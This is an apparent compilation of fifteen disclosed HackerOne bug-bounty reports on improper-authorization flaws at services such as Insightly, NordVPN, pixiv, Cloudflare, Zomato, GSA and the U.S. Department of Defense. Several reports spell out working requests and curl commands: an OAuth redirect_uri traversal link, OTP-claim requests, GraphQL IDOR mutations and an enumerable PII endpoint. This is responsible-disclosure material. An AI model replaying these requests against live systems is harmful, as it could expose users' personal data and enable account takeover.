# Improper Authorization

_15 reports — High/Critical, disclosed_

### [Email verification bypass via request  to endpoint "accounts.insightly.com/signup/provisionuser"](https://hackerone.com/reports/2718253)

- **Report ID:** `2718253`
- **Severity:** Critical
- **Weakness:** Improper Authorization
- **Program:** Insightly
- **Reporter:** @akostak
- **Bounty:** - usd
- **Disclosed:** 2025-08-18T19:55:35.145Z
- **CVE(s):** -

**Vulnerability Information:**

# Summary:
The vulnerability occurs in the "EmailAddress" parameter in the member creation area and affects all users.

##Steps To Reproduce:
Before proceeding with the steps of the vulnerability, have a previously created account or open it now to scenario the attack against existing accounts.

  1-to become a member 
First, go to the address below and type a different e-mail address, then go to the link and fill in the name, surname and password fields. 
*https://accounts.insightly.com/signup*
2. And before you sign up, catch the outgoing requests on burp and change the "EmailAddress" parameter in the request, which I will leave below as image poc.
3.If we are trying to open a new membership to an existing account, we need to write that email in the "EmailAddress" parameter or write the e-mail address of your test account as any other e-mail address.Leave the request and you will be automatically redirected to the account

## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

  * [attachment / reference]

## Impact

The vulnerability concerns all users on Insightly, so even if no account has been opened or an account has been created before, it creates that account again.We can also take over the account.Additionally, when we open a membership to an existing account, we open a new instance and the trial version starts again for 15 days, which causes such a security vulnerability.

---

### [Unauthenticated access to internal API at██████████.███.edu  [HtUS]](https://hackerone.com/reports/1627980)

- **Report ID:** `1627980`
- **Severity:** High
- **Weakness:** Improper Authorization
- **Program:** U.S. Dept Of Defense
- **Reporter:** @matrixsoftsec
- **Bounty:** - usd
- **Disclosed:** 2024-07-19T14:35:22.725Z
- **CVE(s):** -

**Vulnerability Information:**

#Overview:

* There are multiple API calls using which an attacker user is able to gain unauthenticated access to internal API████████.██████.edu via Azure API url appg3entcalapi.azurewebsites.net.  

* The access to█████.██████.edu is via microsoft and only allows internal users to access it.

* The appg3entcalapi.azurewebsites.net is listed as the API under the javascript located at [https://eventscalendar.████.edu/app.js](https://eventscalendar.██████.edu/app.js)

██████

#Steps to reproduce:

#(I) Vulnerable Request: Disclose PII of internal users-

```
GET /api/person/Default.GetAllPersons HTTP/1.1
Host: appg3entcalapi.azurewebsites.net
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Length: 2

{}
```

* Copy the above vulnerable request to your BURP repeater tab and fire the request.

* Notice the 200 OK response disclosing the details.

██████████

#(II) Vulnerable Request: Disclose adgroups & internal emails-

```
GET /api/AdGroup HTTP/1.1
Host: appg3entcalapi.azurewebsites.net
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Content-Length: 2

{}
```

* Copy the above vulnerable request to your BURP repeater tab and fire the request.

* Notice the 200 OK response disclosing the details.

█████

#(III) Vulnerable Request:

```
GET /api/EventType HTTP/1.1
Host: appg3entcalapi.azurewebsites.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Length: 2

{}
```

* Copy the above vulnerable request to your BURP repeater tab and fire the request.

* Notice the 200 OK response disclosing the details.

███████

## Impact

Unauthenticated access to internal API at████.████████.edu

---

### [Subscription check bypass of NordVPN service ](https://hackerone.com/reports/2012443)

- **Report ID:** `2012443`
- **Severity:** High
- **Weakness:** Improper Authorization
- **Program:** Nord Security
- **Reporter:** @tlsh1
- **Bounty:** - usd
- **Disclosed:** 2023-07-17T11:58:52.752Z
- **CVE(s):** -

**Summary (team):**

The reporter identified an issue in one of the NordVPN's infrastructure backend services responsible for checking if the user has a valid subscription. Successful exploitation of this issue does not permanently grant lifetime access to the VPN services, nor does it affect the confidentiality or integrity of other users. To abuse this service a user would have to perform the exploitation steps each time they wish to connect to the VPN service.
We are aware that the exploitation of this service is a bit different on mobile applications this is based on minor distinctions between applications' architectural decisions. Nonetheless, the root cause and impact- users can access NordVPN service without an active subscription - is the same for all platforms.

---

### [[HTA2] Authorization Bypass on https://██████ leaks confidential aircraft/missile information](https://hackerone.com/reports/736391)

- **Report ID:** `736391`
- **Severity:** Critical
- **Weakness:** Improper Authorization
- **Program:** U.S. Dept Of Defense
- **Reporter:** @cdl
- **Bounty:** - usd
- **Disclosed:** 2023-04-14T17:29:28.858Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
There is an authorization bypass on https://██████  which allows a remote, unauthenticated attacker to bypass the "██████Single Sign-On" and view the application as an authenticated user.

## Details:
The host at ████ uses Akamai as a load balancer and routes traffic back to an internal server:

```
root@doggos:~# dig A ████
-- snip --
;; ANSWER SECTION:
███. 2386	IN	CNAME	█████.
████. 1554 IN CNAME ███.
███████. 180 IN CNAME e1010.d.akamaiedge.akamai.█████████.
e1010.d.akamaiedge.akamai.██████.	20 IN A	██████████
``` 

When attempting to hit the website, you are redirected to `https://█████████/pool/sso/authenticate/l/2?m=GET&r=t&u=https%3A%2F%2F████████%2F` and requires the visitor to authenticate via SSO.

However, I was able to find the Origin IP of this server. Hitting this Origin IP completely circumvents the ████████ SSO and allows the visitor to use the application as an authenticated user.

## Steps To Reproduce:
  1. Try visiting the application here: https://███. You'll see you are redirected to login via SSO.

█████████

  2. Run the following command to verify that ████ is the Origin IP for `█████████` by pulling the names from the SSL certificate:

```
root@doggos:~#  true | openssl s_client -connect ██████:443 2>/dev/null | openssl x509 -noout -text | perl -l -0777 -ne '@names=/\bDNS:([^\s,]+)/g; print join("\n", sort @names);'

█████████
```

  3. Now visit the application: https://█████
  4. You'll see that you can now use the application as an authenticated user by clicking through the sidebar:

███

You can search through past messages / updates on aircraft and missles here: 

https://███/Guest/MessageSearch.aspx

## Impact

Critical. A remote, unauthenticated attacker can view and download confidential information from this application. For instance, I clicked on one of the messages at https://████████/Guest/MessagesDetails.aspx and it downloaded a document containing sensitive information about some issues with some██████████:

█████████

████████


Best,
Corben Leo (@cdl)

---

### [Stealing Users OAuth authorization code via redirect_uri](https://hackerone.com/reports/1861974)

- **Report ID:** `1861974`
- **Severity:** High
- **Weakness:** Improper Authorization
- **Program:** pixiv
- **Reporter:** @kuzu7shiki
- **Bounty:** 2000 usd
- **Disclosed:** 2023-03-22T08:59:58.038Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Path traversal in OAuth `redirect_uri` which can lead to users authorization code being leaked to any malicious user.

The following authorization code flow request is generated at booth login.
```
https://oauth.secure.pixiv.net/v2/auth/authorize?client_id=a1Z7w6JssUQkw5Hid0uIDeuesue9&redirect_uri=https%3A%2F%2Fbooth.pm%2Fusers%2Fauth%2Fpixiv%2Fcallback&response_type=code&scope=read-works+read-favorite-users+read-friends+read-profile+read-email+write-profile&state=%3A1a38b53563599621ce25094661b1c4458ddb52d79d771149
```

Path traversal vulnerability in this `redirect_uri` parameter allows the attacker to direct the user to the product page created by the attacker.
```
redirect_uri=https%3A%2F%2Fbooth.pm%2Fusers%2Fauth%2Fpixiv%2Fcallback/../../../../ja/items/4503924
```
-> redirected to https://booth.pm/ja/items/4503924

If the attacker had Google Analytics enabled, the query string could be exposed when the victim is redirected to the product page, so the unused authorization code is leaked.

## Steps To Reproduce:

  1. The attacker makes his shop public. Register his products and set up his Google Analytics tracking ID.
  2. Have the victim click on the following link; the value of the state parameter can be anything.
```
https://oauth.secure.pixiv.net/v2/auth/authorize?client_id=a1Z7w6JssUQkw5Hid0uIDeuesue9&redirect_uri=https%3A%2F%2Fbooth.pm%2Fusers%2Fauth%2Fpixiv%2Fcallback/../../../../ja/items/[attacker's product id]&response_type=code&scope=read-works+read-favorite-users+read-friends+read-profile+read-email+write-profile&state=%3A1a38b53563599621ce25094661b1c4458ddb52d79d771149
```

  3. When the victim clicks on the above link and proceeds with the login process, he is redirected to the attacker's product page.

  4. The attacker can steal victims' authorizaiton code from Google Analytics real-time reports.

## Impact

Due to path traversal in `redirect_uri` parameter in OAuth flow, its possible to redirect authenticated users to attacker's product page with their OAuth credentials from which its possible to takeover their account.

---

### [Account takeover - improper validation of jwt signature (with regards  to experiation date claim)](https://hackerone.com/reports/1760403)

- **Report ID:** `1760403`
- **Severity:** High
- **Weakness:** Improper Authorization
- **Program:** Linktree
- **Reporter:** @twelvesix
- **Bounty:** - usd
- **Disclosed:** 2022-12-26T08:24:18.347Z
- **CVE(s):** -

**Summary (team):**

Some backend services did not properly validate JWTs. As a result JWT validation could be bypassed by setting the expiration date claim to a unix timestamp in the past, and abusing this for account takeover.

**Summary (researcher):**

The expiration date claim of the JWT token was not properly handled. I was able to bypass validation by changing the expiration date to a date in the past.

---

### [Hijack all emails sent to any domain that uses Cloudflare Email Forwarding](https://hackerone.com/reports/1419341)

- **Report ID:** `1419341`
- **Severity:** Critical
- **Weakness:** Improper Authorization
- **Program:** Cloudflare Public Bug Bounty
- **Reporter:** @albertspedersen
- **Bounty:** 6000 usd
- **Disclosed:** 2022-07-28T16:35:11.651Z
- **CVE(s):** -

**Summary (team):**

The Email Routing feature enables Cloudflare users to create any number of custom email addresses and route all incoming messages to the user's preferred inboxes.
Due to a bug in zone ownership verification, it was possible to configure Email Routing to redirect e-mail messages for an unverified zone (with Email Routing enabled) to a different mailbox. In addition, the vulnerability allowed the e-mail forwarding configuration created by the zone owner to be overwritten.

The issue has since been fixed by the Engineering team and zone ownership verification is working as expected when setting up Email forwarding rules. We investigated the exploit and validated it had only been found by the security researcher who responsibly disclosed the issue.

**Summary (researcher):**

This vulnerability made it possible to deploy a rogue Email Routing configuration for an unverified zone (i.e. a domain you don't own) that would override the existing configuration on Cloudflare's mail servers.

This made it possible to 1. read any email sent to the target domain; and 2. stop any email sent to the target domain from arriving at the original destination address.

The target domain had to already be using Cloudflare Email Routing as the vulnerability did not enable modification of DNS records.

---

### [Claiming the listing of a non-delivery restaurant through OTP manipulation](https://hackerone.com/reports/1330529)

- **Report ID:** `1330529`
- **Severity:** Critical
- **Weakness:** Improper Authorization
- **Program:** Eternal
- **Reporter:** @ashoka_rao
- **Bounty:** 3250 usd
- **Disclosed:** 2022-02-22T08:51:15.229Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** Am able to claim any restaurant which is not claimed before.

**Description:** An endpoint `POST /restaurant-onboard-diy/v2/send-auto-claim-otp HTTP/2` sends OTP to the restaurant mobile no.

##Request (Request:1) is - 
```
POST /restaurant-onboard-diy/v2/send-auto-claim-otp HTTP/2
Host: www.zomato.com
Cookie: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
Content-Length: 58
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="90"
Accept: application/json, text/plain, */*
X-Zomato-Csrft: XXXXXXXXXXXXXXXXXXXXXXX
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: https://www.zomato.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://www.zomato.com/partner_with_us/ownership
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"number":"XXXXXXXXXX","isdCode":"+91","resId":"XXXXXXXXXX"}
```
which responses -
```
{"status":"success","message":"OTP SENT","requestId":XXXXXXX,"code":2}
```

###Here Attacker gains OTP on his own mobile no by changing the `number` & `resId` to his own restaurant.

By using the following request (Request:2) attacker is able to map his e-mail Id as `Owner / Manager` to Victim restaurant.
##Request:2
```
POST /restaurant-onboard-diy/v2/verify-auto-claim-otp HTTP/2
Host: www.zomato.com
Cookie: XXXXXXXXXXXXXXXX
Content-Length: 68
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="90"
Accept: application/json, text/plain, */*
X-Zomato-Csrft: XXXXXXXXXXXXXXXXXXXXX
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: https://www.zomato.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://www.zomato.com/partner_with_us/ownership
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"verificationCode":XXX,"requestId":"XXXXXXXX","resId":"XXXXXXXXX"}
```

###Here by changing the `verificationCode`  -  (Otp received on Attacker Mobile in response of Request :1 )& `requestId`  (Response of request:1) and `resId` to Victim Restaurant. Request:2 maps e-mail id of Attacker to Victim restaurant.

**Prerequisite - Attacker should have a restaurant page, mapped Mobile No With Email Id.**

**Note : -  If any restaurant is not mapped owner / manager then claimed restaurant can be claimed **

## Impact

Claim a restaurant.

**Summary (team):**

Thanks to @ashoka_rao for reporting this issue. The Researcher demonstrated a way to takeover an unclaimed non-delivery restaurant on our platform.

---

### [Improper authorization allows disclosing users' notification data in Notification channel server](https://hackerone.com/reports/1314162)

- **Report ID:** `1314162`
- **Severity:** High
- **Weakness:** Improper Authorization
- **Program:** LY Corporation
- **Reporter:** @aki__0421
- **Bounty:** 2000 usd
- **Disclosed:** 2021-12-31T12:08:28.308Z
- **CVE(s):** -

**Summary (team):**

LINE Channel authentication provides separate authentication tokens for each LINE Channel. Due to the bug in the authentication process in the Notifications Channel service, it could be possible for an attacker to get the Notifications Channel data of another user by using their valid authentication token from another channel, for example, if an attacker creates their own channel and makes victim account to join it.

---

### [[Transportation Management Services Solution 2.0] Improper authorization at  tmss.gsa.gov leads to data exposure of all registered users](https://hackerone.com/reports/1175980)

- **Report ID:** `1175980`
- **Severity:** Critical
- **Weakness:** Improper Authorization
- **Program:** U.S. General Services Administration
- **Reporter:** @alexandrio
- **Bounty:** - usd
- **Disclosed:** 2021-12-08T15:36:46.105Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hi team!
I hope you are having a great Tuesday :)

**Where:** https://tmss.gsa.gov/ 
**Who:** Unathenticated users
**Why:** Improper Access Control at `/tmssserver/api/public/customerregistration/{:id}/userId/`


I found an endpoint (`/tmssserver/api/public/customerregistration/{:id}/userId/`) at https://tmss.gsa.gov/ (Transportation Management Services Solution (TMSS) 2.0) that  leads to data exposure of all registerd user at the platform,  including the following data: 

* Email address
* Phone Number
* Full Name
* Secret question (If set)

## Steps To Reproduce:
1. Go to https://tmss.gsa.gov/
2. Check that you are not authenticated. 
3. Now browse to https://tmss.gsa.gov/tmssserver/api/public/customerregistration/4750/userId/ (You can replace 4750 by any other value between 0 and 4800)
4. Or just CURL `curl "https://tmss.gsa.gov/tmssserver/api/public/customerregistration/4750/userId/" . The response includes email, Full name, and phone number of user with id 4750. 
{F1279543}

This is how the request looks like. As you can see there is no cookie in the headers or authentication bearer.
```curl
GET /tmssserver/api/public/customerregistration/4500/userId/ HTTP/1.1
Host: tmss.gsa.gov
Connection: close
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"
Accept: application/json, text/plain, */*
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://tmss.preprod-acqit.helix.gsa.gov/tmss/customerregistration
Accept-Language: es-ES,es;q=0.9
dnt: 1
sec-gpc: 1

```
5. As the id is incremental note that this can be easily brute-forced to leak all the user's information. 
 `https://tmss.gsa.gov/tmssserver/api/public/customerregistration/:id/userId/`

6. I was not able to submit my user ID as I don't have one until my account gets approved, but using this endpoint you can check that my data is also being leaked here.

`curl "https://tmss.gsa.gov/tmssserver/api/public/customerregistration/alexandrio+1@wearehackerone.com/emailId/"`

{F1279546}

```
{"userRegisterId":192,"registrationType":"User","reportingOfficialId":1504,"agencyCode":"072","bureauCode":"00","firstName":"Alexandrio","lastName":"Wearehackerone","middleInitial":"C","title":"","addressLine1":"ThisIsMYAddress","addressLine2":"PoCAddress","city":"","stateId":null,"zip":"","zipSuffix":"","countryId":326,"phone":"6541112343","phoneExtension":"","email":"alexandrio+1@wearehackerone.com","accessRequested":"HHG","registrationStatus":"Confirm Pending","rejectReason":null,"confirmDate":null,"createdDate":"2021-04-26T22:51:08.000+0000","updateProgram":"Customer_Registration","updateId":null,"updateDate":"2021-04-26T22:51:08.000+0000","agencyName":null,"agencyBureauName":null,"stateName":null,"countryName":null}
```



If you have some questions regarding this feel free to ping me!
Bests,
@alexandrio

## Impact

Data exposure (Emails, addresses, phone numbers, full names etc) of all registered user - Unauthenticated users

---

### [[dubmash] Lack of authorization checks - Update Sound Titles](https://hackerone.com/reports/1102365)

- **Report ID:** `1102365`
- **Severity:** High
- **Weakness:** Improper Authorization
- **Program:** Reddit
- **Reporter:** @sandeep_rj49
- **Bounty:** - usd
- **Disclosed:** 2021-10-21T19:49:54.149Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
During the security testing, it has been observed that the `UpdateSound` api is vulnerable to IDOR. It allows an attacker to edit the victim's sound track titles. This vulnerability can be exploited using the sound track's uuid in the vulnerable request. This id is publicly known. 


## Steps To Reproduce:
1. Replay the vulnerable request using a valid authorization token. 
2. Change the uuid parameter value with the victim's sound track UUID. 
3. Victim's sound track title will be changed. 

##Vulnerable request:
curl -i -s -k -X $'POST' \
    -H $'Host: gateway-production.dubsmash.com' -H $'X-Dmac: ' -H $'X-Remote-Config-Values: []' -H $'X-Time: 1613158267' -H $'User-Agent: Dopesmash/5.20.0 (com.mobilemotion.dubsmash; build:45431; iOS 14.0.1) Alamofire/5.4.0' -H $'X-Accept-Content-Language: en_IN' -H $'X-Device-Timezone: 19800' -H $'X-Device-Language: en' -H $'X-Device-Country: IN' -H $'X-Build-Number: 45431' -H $'Content-Length: 676' -H $'X-App-Version: 5.20.0' -H $'X-Platform: ios' -H $'Connection: close' -H $'Authorization: Bearer XXXXXX' -H $'X-Dubsmash-Device-Id: 0675382B-668E-4EB7-8313-ED96BC132DC9' -H $'Accept-Language: en-IN;q=1.0, hi-IN;q=0.9' -H $'Accept: application/json' -H $'Content-Type: application/json' -H $'X-Dmac-Version: 2' -H $'If-None-Match: W/\"88-IVjhmW06Njcacim4nwHnJNviYsE\"' \
    -b $'__cfduid=' \
    --data-binary $'{\"query\":\"mutation UpdateSound($input: UpdateSoundInput!) {\\n  updateSound(input: $input) {\\n    __typename\\n    sound {\\n      __typename\\n      ...SoundFragment\\n    }\\n  }\\n}\\nfragment SoundFragment on Sound {\\n  __typename\\n  uuid\\n  created_at\\n  sound\\n  name\\n  waveform_raw_data\\n  liked\\n  soundStatus: status\\n  creator {\\n    __typename\\n    ...ContentCreatorFragment\\n  }\\n  share_link\\n  num_likes\\n  num_videos\\n}\\nfragment ContentCreatorFragment on User {\\n  __typename\\n  username\\n  uuid\\n  date_joined\\n  followed\\n  has_invite_badge\\n  badges\\n  profile_picture\\n}\",\"variables\":{\"input\":{\"uuid\":\"a687eb61ad814a09a8a85cedef7837f3\",\"name\":\"test12355556777\"}}}' \
    $'https://gateway-production.dubsmash.com/graphql?build_number=45431&platform=ios'

## Impact

An attacker can change the title of the victim's sound track to some malicious title like accounthack or similar.

---

### [Email address of any user can be queried on Report Invitation GraphQL type when username is known](https://hackerone.com/reports/792927)

- **Report ID:** `792927`
- **Severity:** High
- **Weakness:** Improper Authorization
- **Program:** HackerOne
- **Reporter:** @msdian7
- **Bounty:** - usd
- **Disclosed:** 2020-02-20T16:58:04.631Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
Email  id  of all hackerone users disclosure

**Description:**
There is an flaw , with that i can get all hackerone users email id 

### Steps To Reproduce

1. Invoke the below graphql call

POST /graphql HTTP/1.1

```{"query":"mutation Revoke_credential_mutation($input_0:AddReportParticipantInput!) {addReportParticipant(input:$input_0) {clientMutationId,...F1}}  fragment F1 on AddReportParticipantPayload {clientMutationId,was_successful,errors{nodes{message}},invitation{email,token}}","variables":{"input_0":{"report_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MjYzNzE=","email":"██████████","username":"jobert"}}}```

you will get below response

```
{"data":{"addReportParticipant":{"clientMutationId":null,"was_successful":true,"errors":{"nodes":[]},"invitation":{"email":"████","token":null}}}}
```

2.  to reproduce from your account, create one test program, and create one report for that program, get that report id 
gid://hackerone/Report/626371 (here 626371 my test program's report id)  convert it into base 64, replace that id with the "report_id" in the above graphql query 
3.   Done

## Impact

PII disclosed

**Summary (team):**

# Issue Summary
Through the HackerOne Bug Bounty Program on February 11, 2020 at 5:55 UTC, a HackerOne community member (“hacker”) notified HackerOne that they were able to determine a user’s email address by generating an invitation using only their username. The team patched the vulnerability at 08:30 UTC the same day.

The technical investigation finished at 8:40 UTC, concluding that there was no malicious intent or indicators of exploitation.

# Timeline
| Date Time (UTC) | Action |
|---|---|
|2020-02-10 15:13|Software containing vulnerability deployed to production.
|2020-02-11 05:53|Vulnerability submitted to HackerOne’s bug bounty program.
|2020-02-11 05:55|Incident Response (IR) team member on-call was paged about a critical severity report submitted to the HackerOne bug bounty program.|
|2020-02-11 05:57|The on-call team member triaged the report and notified the full IR team.|
|2020-02-11 06:04|A specialized IR team was assembled and began the investigation.|
|2020-02-11 08:30|A vulnerability patch was deployed.|
|2020-02-11 08:44|HackerOne’s IR team concluded technical investigation.|
|2020-02-11 23:54|Two users were alerted that their information was exposed to the reporters who submitted the vulnerability.|

# Root Cause
HackerOne has an invitation system that allows program owners to send invitations to users for various purposes, such as invitations to hack on private programs, claim bounties, be added to programs, among others. The invitation system allows users to be invited by email or by username. If a user is invited by their username, the sender is not permitted to view the email address the invitation is sent to for user privacy. This rule has been guarded by HackerOne’s Access Control Lists (ACLs) in HackerOne’s Representational state transfer (REST) framework, but HackerOne has been migrating these objects to GraphQL under a new protection layer. When exposing a new invitation object, the ACL rule previously applied wasn’t implemented correctly to the new GraphQL protection layer.

*How could this have been exploited to impact any user?*
HackerOne provides demo programs for customers to experience the product as well as hackers to test against our production system. When you are a team member in a demo program, you can demo the report interface. In the report interface, you can invite an external participant to the report, which could be any user on the platform. By generating that invitation with a username and then viewing the invitation, the user’s email could have been exposed.

# Resolution and Recovery
At 5:57 UTC, HackerOne successfully reproduced the vulnerability as described by the reporter. The IR team identified the change that introduced the vulnerability shortly after. A fix was deployed at 8:30 UTC, adding the necessary ACL into the GraphQL protection layer.

The IR team worked in parallel to identify the accounts impacted. It was determined shortly after the fix that there were no other usages except for those attempts by the reporter.

The maximum possible impact was assumed in determining the Common Vulnerability Scoring System (CVSS) score, which resulted in High (8.3). HackerOne decided to award a bonus of $1,000 due to the time to discover the vulnerability since the code was released, approximately 16 hours after the change was deployed.
# Vulnerability Impact on Data
The reporter accessed the email addresses of two specific users to verify the findings, no other information could have been accessed with the discovered vulnerability.

|Attribute| Description |
|---|---|
|email|The email address of the user invited|

# Preventative Measures
As part of the HackerOne Incident Response process, HackerOne has conducted an internal review and analysis of the incident. HackerOne has taken the following actions to address the underlying cause of the issue and help prevent future occurrence.

## Implement the proper ACL check within the invitation model

This change was the mitigating fix for resolving this vulnerability. It was deployed at 8:30UTC.

## Identify sensitive database fields being added to GraphQL

HackerOne maintains a list of sensitive database fields. The application security team is planning to leverage this list to have engineers acknowledge that they’ve, to their knowledge, properly implemented the authorization logic when they put up a code merge request. This change is expected to be implemented in Q1 2020.

---

### [Improper Authorization](https://hackerone.com/reports/751299)

- **Report ID:** `751299`
- **Severity:** High
- **Weakness:** Improper Authorization
- **Program:** Stripo Inc
- **Reporter:** @abdellah29
- **Bounty:** - usd
- **Disclosed:** 2020-02-03T13:33:07.442Z
- **CVE(s):** -

**Vulnerability Information:**

hi there ,

i found an vulnerability on  https://my.stripo.email/cabinet/#/users/orog_id ,

generally every user have an organisation and the organisation contain projects , 

lets suppose : test@gmail.com is the owner of the project

and test2@gmail.com was invited to his project as admin , in normal situation the owner can not be removed even if second account is admin

the issue is i can removed the owned from hi position to admin , and the big problem once the owner is removed he can not login again to his account


## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. you must have 2 account , one owner , the second got invited as admin

  2. log in with your second account and go to https://my.stripo.email/cabinet/#/users/xxxx

       you will see that the input of role is disabled , enable it via inspect element ( f12) , 

then change the role of owner for it to admin , an PUT request will be sent

##http request

PUT /cabinet/stripeapi/v1/organizations/135428/users HTTP/1.1
Host: my.stripo.email
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Bearer null
Content-Type: application/json;charset=UTF-8
Cache-Control: no-cache
Pragma: no-cache
Expires: Sat, 01 Jan 2000 00:00:00 GMT
Content-Length: 231
Origin: https://my.stripo.email
Connection: close
Referer: https://my.stripo.email/cabinet/
Cookie: __stripe_mid=f1a62f3d-2ba4-4742-a1ae-97c309223fec; __stripe_sid=20155b5b-e547-4e52-9c4c-53fd4b08ed8a; _ga=GA1.2.472610903.1575449565; _gid=GA1.2.1705021668.1575449565; _fbp=fb.1.1575449579810.16963820; token=eyJhbGciOiJIUzI1NiJ9.eyJzZWN1cml0eUNvbnRleHQiOiJ7XCJ1c2VySW5mb1wiOntcImlkXCI6MTMwODUxLFwiZW1haWxcIjpcImFiZGVsbGFobmFkaTNAZ21haWwuY29tXCIsXCJsb2NhbGVLZXlcIjpcImVuXCIsXCJmaXJzdE5hbWVcIjpcInRlc3Q0NVwiLFwibGFzdE5hbWVcIjpcIm5cIixcImdhSWRcIjpcImJiYzBkNGExLWI5NDYtNDIwMy1iOTNmLTcxNjhmYmEyMWI5ZVwiLFwicGhvbmVzXCI6W10sXCJhY3RpdmVcIjpmYWxzZSxcImFjdGl2ZVByb2plY3RJZFwiOjEzNzg3NyxcImlzU3VwZXJVc2VyXCI6ZmFsc2UsXCJzdXBlclVzZXJWMlwiOmZhbHNlLFwib25seUZiQ3JlZGVudGlhbHNcIjpmYWxzZSxcInNldHRpbmdzRW1haWxTb3J0QnlcIjpcImNyZWF0ZWRUaW1lXCIsXCJzZXR0aW5nc0VtYWlsU29ydEFzY1wiOmZhbHNlLFwic2V0dGluZ3NUZW1wbGF0ZVNvcnRCeVwiOlwidXBkYXRlZFRpbWVcIixcInNldHRpbmdzVGVtcGxhdGVTb3J0QXNjXCI6ZmFsc2UsXCJjb2xvclwiOlwiI2ZiYTc2ZlwiLFwib3JnYW5pemF0aW9uSWRcIjoxMzA2NjUsXCJzdWJzY3JpcHRpb25UeXBlXCI6XCJGUkVFXCIsXCJjb25zZW50UmVjZWl2ZWRcIjp0cnVlLFwidGVtcGxhdGVDcmVhdGVkT25Mb2dpblwiOmZhbHNlLFwiZmlyc3RMb2dpblwiOmZhbHNlfSxcImlzc3VlZEF0XCI6MTU3NTQ1MDIzMDMxOH0ifQ.GidxPLc4Wu80JWxScUjLrq4nmLr2lEamONcWsATBQfY; intercom-session-b1m243ec=Tlk4aHpydmFMOTc5SlZRaGRabE43WUIwanoxdXAyNlowR3FWbE9oaXNDRm5mYlhRRHNBNjlyLzJOOWQybmtYQi0tZzUrdnd1enBReWhPM0J3M1N2SFIzUT09--a917964bb8221fad0a6d3e38fab8cde2af1efed4

{"repository":{},"idField":"id","entityType":"USER","id":135628,"role":"admin","organizationId":135428,"firstName":"TESt","lastName":"account","color":"#cc90e2","email":"pain45@wearehackerone.com","projectIds":[],"suspended":false} 

##http response :


HTTP/1.1 200 
Server: nginx
Date: Wed, 04 Dec 2019 09:56:41 GMT
Content-Type: application/json;charset=UTF-8
Connection: close
Vary: Accept-Encoding
█████████
████
X-Frame-Options: sameorigin
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Length: 180

█████cc90e2","email":"pain45@wearehackerone.com","projectIds":[],"suspended":false}

i hope it is clear , 

thanks

## Impact

an attacker ( already admin ) can remove the owner from his role , and the last one can not login any more to his account

---

### [Account Takeover via billing](https://hackerone.com/reports/394329)

- **Report ID:** `394329`
- **Severity:** Critical
- **Weakness:** Improper Authorization
- **Program:** Chaturbate
- **Reporter:** @jolteon
- **Bounty:** 8000 usd
- **Disclosed:** 2018-09-19T22:33:17.925Z
- **CVE(s):** -

**Summary (team):**

The hacker found that when subscribing to a fanclub the parameters could be manipulated to purchase a fanclub subscription for another user. This will set the email of the target account if they had no email on file. This could then be used to reset the password for the target user.

The purchasing logic was fixed to not allow modifying of these parameters. The attack could only target accounts with no email on file, and required a purchase.

---

### [Shopify admin authentication bypass using partners.shopify.com](https://hackerone.com/reports/270981)

- **Report ID:** `270981`
- **Severity:** Critical
- **Weakness:** Improper Authorization
- **Program:** Shopify
- **Reporter:** @rockrzhackr9z
- **Bounty:** - usd
- **Disclosed:** 2017-09-28T17:41:33.883Z
- **CVE(s):** -

